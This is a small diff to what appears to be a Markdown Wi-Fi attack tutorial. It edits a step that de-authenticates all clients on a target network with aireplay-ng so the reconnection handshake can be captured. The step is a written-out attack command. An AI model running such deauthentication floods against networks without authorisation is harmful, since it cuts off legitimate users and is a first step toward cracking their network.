@@ -273,7 +273,7 @@ The purpose here is to disconnect clients so that, upon reconnection, we can cap
 
 #### 3.1 De-authenticate clients on the target network:
 ```bash
-aireplay-ng -0 0 -a <BSSID> <interface>
+sudo aireplay-ng --deauth 0 -a <BSSID> <interface>
 ```
 - **[Image with Explanation]:** Screenshot of `aireplay-ng` running with deauthentication packets being sent, indicating client disconnection.
 
